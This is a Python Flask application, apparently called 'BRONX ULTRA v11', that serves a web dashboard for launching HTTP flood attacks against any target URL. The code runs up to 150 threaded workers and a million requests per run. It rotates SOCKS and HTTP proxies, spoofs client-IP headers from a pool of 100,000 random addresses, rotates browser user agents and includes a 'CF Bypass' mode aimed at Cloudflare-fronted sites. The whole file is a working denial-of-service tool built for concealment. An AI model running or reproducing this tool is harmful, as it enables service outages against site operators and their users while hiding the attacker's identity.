from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}  # Live counter per attack

# ⚡ CLOUDFLARE IPs
CF_IPS = [
    "104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5",
    "104.16.0.1","104.16.0.2","104.16.0.3","104.16.0.4",
    "172.67.0.1","172.67.0.2","172.67.0.3","172.67.0.4",
]

# 🔒 PROXIES
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
]
SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145",
]
HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
]

custom_proxies = []
proxy_enabled = True

# ============================================
# 🛡️ 100,000 FAKE IPs - NEVER SAME IP TWICE
# ============================================
def generate_fake_ip():
    """Generate COMPLETELY RANDOM IP from all possible ranges"""
    octets = []
    for _ in range(4):
        octets.append(str(random.randint(1, 254)))
    return ".".join(octets)

# Pre-generate 100,000 fake IPs
FAKE_IP_POOL = [generate_fake_ip() for _ in range(100000)]
fake_ip_index = 0

def get_next_fake_ip():
    """Get next unique fake IP (never repeats)"""
    global fake_ip_index
    fake_ip_index = (fake_ip_index + 1) % len(FAKE_IP_POOL)
    return FAKE_IP_POOL[fake_ip_index]

# ============================================
# 🎭 100+ BROWSER FINGERPRINTS
# ============================================
BROWSERS = [
    # Chrome Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Windows", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "os": "Windows", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36", "os": "Windows", "browser": "Chrome"},
    # Chrome Mac
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "macOS", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "os": "macOS", "browser": "Chrome"},
    # Chrome Linux
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", "os": "Linux", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36", "os": "Linux", "browser": "Chrome"},
    # Firefox Windows
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", "os": "Windows", "browser": "Firefox"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0", "os": "Windows", "browser": "Firefox"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0", "os": "Windows", "browser": "Firefox"},
    # Firefox Mac
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0", "os": "macOS", "browser": "Firefox"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0", "os": "macOS", "browser": "Firefox"},
    # Edge
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "os": "Windows", "browser": "Edge"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", "os": "Windows", "browser": "Edge"},
    # Safari
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", "os": "macOS", "browser": "Safari"},
    {"ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15", "os": "macOS", "browser": "Safari"},
    # Mobile
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "os": "iOS", "browser": "Safari"},
    {"ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", "os": "Android", "browser": "Chrome"},
    {"ua": "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "os": "iOS", "browser": "Safari"},
] * 5  # Multiply for 100+ variations

# ============================================
# ⚡ ULTRA FAST REQUEST FUNCTION
# ============================================
def ultra_request(url, mode, proxy_info=None):
    """ULTRA FAST request with COMPLETE IP HIDING"""
    try:
        # Get unique fake IP for THIS request
        fake_ip = get_next_fake_ip()
        
        # Get random browser fingerprint
        browser = random.choice(BROWSERS)
        
        # Build headers with fake IP
        headers = {
            "User-Agent": browser["ua"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.9"]),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            # 🔥 FAKE IP HEADERS - TARGET WILL SEE THESE
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Client-IP": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "X-Remote-Addr": fake_ip,
            "CF-Connecting-IP": fake_ip,
            "True-Client-IP": fake_ip,
            "X-Cluster-Client-IP": fake_ip,
            "Forwarded": f"for={fake_ip};proto=https",
            "X-Forwarded": fake_ip,
        }
        
        # Add referrer
        if random.random() > 0.3:
            headers["Referer"] = random.choice([
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://www.instagram.com/",
            ])
        
        proxies = None
        if proxy_info:
            ptype, paddr = proxy_info
            if ptype == "socks5":
                proxies = {"http": f"socks5://{paddr}", "https": f"socks5://{paddr}"}
            elif ptype == "socks4":
                proxies = {"http": f"socks4://{paddr}", "https": f"socks4://{paddr}"}
            elif ptype in ["http", "https"]:
                proxies = {"http": f"http://{paddr}", "https": f"http://{paddr}"}
        
        if mode == "cf":
            cf_ip = random.choice(CF_IPS)
            headers["Host"] = url.split("//")[-1].split("/")[0]
            response = requests.get(f"https://{cf_ip}/", headers=headers, timeout=8, verify=False)
        else:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=8, verify=False, allow_redirects=True)
        
        return response.status_code < 400
    except:
        return False

# ============================================
# ⚡ ULTRA FAST WORKER (LIVE COUNTER)
# ============================================
def attack_worker(attack_id, url, count, speed, mode):
    """Worker with LIVE counter"""
    delays = {"slow": 0.05, "fast": 0.005, "ultra": 0.0001}
    delay = delays.get(speed, 0.005)
    
    all_proxies = []
    if proxy_enabled:
        for p in SOCKS5_PROXIES: all_proxies.append(("socks5", p))
        for p in SOCKS4_PROXIES: all_proxies.append(("socks4", p))
        for p in HTTP_PROXIES: all_proxies.append(("http", p))
        for cp in custom_proxies:
            if cp.startswith("socks5://"): all_proxies.append(("socks5", cp.replace("socks5://","")))
            elif cp.startswith("socks4://"): all_proxies.append(("socks4", cp.replace("socks4://","")))
            elif "://" in cp: all_proxies.append(("http", cp.split("://")[-1]))
            else: all_proxies.append(("socks5", cp))
    
    proxy_index = 0
    req_count = 0
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        # Rotate proxy every 50 requests
        proxy_info = None
        if all_proxies:
            if req_count >= 50:
                proxy_index = (proxy_index + 1) % len(all_proxies)
                req_count = 0
            proxy_info = all_proxies[proxy_index]
            req_count += 1
        
        # Select mode
        current_mode = mode
        if mode == "all":
            current_mode = random.choice(["direct", "cf", "socks5", "socks4", "http"])
        elif mode == "mixed":
            current_mode = random.choice(["cf", "socks5", "http"])
        
        if ultra_request(url, current_mode, proxy_info):
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        
        attack_stats["total"] += 1
        
        # UPDATE LIVE COUNTER
        if attack_id in attack_counters:
            attack_counters[attack_id] = {"done": i+1, "total": count, "success": success, "fail": fail}
        
        # Log every 100 requests
        if i % 100 == 0 and i > 0:
            attack_logs.append(f"📊 [{i}/{count}] ✅{success} ❌{fail} | IP: HIDDEN")
        
        if delay > 0 and i % 10 == 0:
            time.sleep(delay)

# ============================================
# 🚀 LAUNCH ATTACK
# ============================================
def run_ultra_attack(attack_id, url, count, speed, mode):
    """Launch ULTRA FAST attack"""
    workers_map = {"slow": 20, "fast": 50, "ultra": 150}
    workers = workers_map.get(speed, 50)
    req_per_worker = max(1, count // workers)
    
    attack_logs.append(f"🔥 START: {url[:50]}... | {count} REQ | {speed.upper()} | {workers} WORKERS")
    attack_logs.append(f"🛡️ IP STATUS: HIDDEN | 100,000 Fake IPs | Unique IP per request")
    
    # Initialize counter
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(attack_worker, attack_id, url, req_per_worker, speed, mode) for _ in range(workers)]
        for future in as_completed(futures):
            try: future.result(timeout=600)
            except: pass
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    if attack_id in attack_counters:
        del attack_counters[attack_id]
    
    attack_logs.append(f"🏁 DONE: ✅{attack_stats['success']} ❌{attack_stats['failed']} | IP: ALL HIDDEN")

# ============================================
# 🎨 UI - DARK RED THEME
# ============================================
LOGIN = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BRONX ULTRA v11</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif}
.box{background:#0a0000;padding:40px;border-radius:20px;border:2px solid #ff0000;width:380px;text-align:center;box-shadow:0 0 60px rgba(255,0,0,0.3)}
h1{font-size:2em;color:#ff0000;letter-spacing:3px}
.tag{color:#ff4444;font-size:0.7em;letter-spacing:3px;margin:8px 0}
input{width:100%;padding:14px;background:#000;border:1px solid #ff0000;border-radius:10px;color:#ff0000;margin:8px 0;font-size:14px;font-family:monospace}
input:focus{border-color:#ff4444;box-shadow:0 0 20px rgba(255,0,0,0.3);outline:none}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#cc0000,#ff0000);color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;margin-top:10px;letter-spacing:2px}
.btn:hover{box-shadow:0 0 30px #ff0000}
</style></head><body>
<div class="box">
<h1>💀 BRONX ULTRA</h1>
<div class="tag">v11.0 • IP HIDDEN</div>
<p style="color:#666;font-size:0.6em;letter-spacing:1px">100K Fake IPs • Unique IP/Request • Undetectable</p>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">☠️ ACCESS</button>
</form>
{% if error %}<p style="color:#ff0000;margin-top:8px">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BRONX ULTRA v11</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:10px}
.container{max-width:1200px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;border:2px solid #ff0000;border-radius:12px;margin-bottom:15px;background:#0a0000;flex-wrap:wrap;gap:10px}
.header h1{color:#ff0000;font-size:1.4em;letter-spacing:2px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:15px}
.stat{background:#0a0000;border:1px solid #330000;border-radius:10px;padding:15px;text-align:center}
.stat-val{font-size:2em;font-weight:bold}.s{color:#00ff44}.f{color:#ff0000}.t{color:#ff8800}
.stat-label{font-size:0.6em;color:#666;text-transform:uppercase;letter-spacing:2px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:15px}
.card{background:#0a0000;border:1px solid #330000;border-radius:12px;padding:18px}
.card h3{color:#ff4444;margin-bottom:12px;font-size:0.85em;letter-spacing:1px}
input,select,textarea{width:100%;padding:10px;background:#000;border:1px solid #ff0000;border-radius:7px;color:#ff4444;margin:4px 0;font-size:12px;font-family:monospace}
input:focus,select:focus,textarea:focus{border-color:#ff4444;outline:none}
label{font-size:0.55em;color:#888;text-transform:uppercase;letter-spacing:1px;display:block;margin-top:6px}
.btn{width:100%;padding:10px;background:#cc0000;color:#fff;border:none;border-radius:7px;font-weight:700;cursor:pointer;margin:3px 0;font-size:0.7em;text-transform:uppercase;letter-spacing:1px}
.btn:hover{background:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.3)}
.btn-stop{background:#222;color:#ff0000;border:1px solid #ff0000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:6px}
.logs{background:#000;border:1px solid #330000;border-radius:8px;padding:10px;max-height:250px;overflow:auto;font-size:0.65em;font-family:monospace;color:#00ff44}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#aaa}
.badge{display:inline-block;padding:4px 10px;border-radius:12px;font-size:0.55em}
.badge-on{background:rgba(0,255,68,0.1);color:#00ff44;border:1px solid rgba(0,255,68,0.2)}
.counter{font-size:1.5em;color:#ff8800;text-align:center;padding:10px;font-family:monospace}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BRONX ULTRA v11.0</h1><div style="color:#888;font-size:0.55em">100K Fake IPs • Unique IP/Request • IP 100% HIDDEN</div></div>
<a href="/logout" style="color:#ff0000;text-decoration:none;font-size:0.7em">EXIT</a>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 ATTACK</h3>
<label>Target URL</label><input type="text" id="url" placeholder="https://target.com">
<div class="row"><div><label>Requests</label><input type="number" id="count" value="10000"></div><div>
<label>Speed</label><select id="speed"><option value="slow">Slow</option><option value="fast" selected>Fast</option><option value="ultra">ULTRA</option></select>
</div></div>
<label>Mode</label><select id="mode"><option value="direct">Direct</option><option value="cf">CF Bypass</option><option value="socks5">SOCKS5</option><option value="socks4">SOCKS4</option><option value="http">HTTP Proxy</option><option value="mixed">Mixed</option><option value="all" selected>ALL</option></select>
<label>Custom Proxies (IP:Port)</label>
<textarea id="customProxies" rows="2" placeholder="proxy:1080"></textarea>
<button class="btn" onclick="start()">🚀 LAUNCH</button>
<button class="btn btn-stop" onclick="stop()">⏹️ STOP</button>
<div class="counter" id="liveCounter">READY</div>
</div>

<div class="card">
<h3>📊 LIVE STATS</h3>
<div class="row"><div class="stat"><div class="stat-val t" style="font-size:1.3em" id="successRate">0%</div><div class="stat-label">RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.3em" id="rps">0</div><div class="stat-label">REQ/S</div></div></div>
<div style="margin-top:10px;color:#888;font-size:0.6em;text-align:center">
🛡️ STATUS: <span style="color:#00ff44">IP 100% HIDDEN</span><br>
🔒 100,000 FAKE IPs IN ROTATION<br>
💀 UNIQUE IP PER REQUEST
</div>
</div>
</div>

<div class="card"><h3>📜 LOGS</h3><div class="logs" id="logs"><div class="log-e">🛡️ IP HIDING: ACTIVE</div><div class="log-e">🔒 100,000 Fake IPs Ready</div><div class="log-e">💀 Unique IP per Request</div></div></div>
</div>

<script>
var lastTotal=0,lastTime=Date.now(),counterInterval=null;

function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-lastTime;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lastTotal)/(dt/1000));lastTotal=d.total;lastTime=n;}
})}

function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}

function updateCounter(){fetch('/counter').then(r=>r.json()).then(d=>{
if(d.active){document.getElementById('liveCounter').textContent=d.done+'/'+d.total+' ['+d.success+' OK]'}
else{document.getElementById('liveCounter').textContent='READY'}
})}

function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value;
var speed=document.getElementById('speed').value,mode=document.getElementById('mode').value;
var proxies=document.getElementById('customProxies').value;
if(!url){alert('Enter URL!');return}
fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:proxies})});
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{
l();u();if(counterInterval)clearInterval(counterInterval);counterInterval=setInterval(updateCounter,500)})}

function stop(){fetch('/stop',{method:'POST'}).then(()=>{if(counterInterval){clearInterval(counterInterval);counterInterval=null}document.getElementById('liveCounter').textContent='STOPPED';l()})}

setInterval(function(){l();u()},1000)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip()]
    return jsonify({"status":"ok"})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),1000000)
    speed = d.get('speed','fast')
    mode = d.get('mode','all')
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_ultra_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    if active_attacks:
        for aid in active_attacks:
            if aid in attack_counters:
                return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BRONX ULTRA v11.0")
    print(f"🔒 Fake IPs: {len(FAKE_IP_POOL)}")
    print(f"🎭 Browsers: {len(BROWSERS)}")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
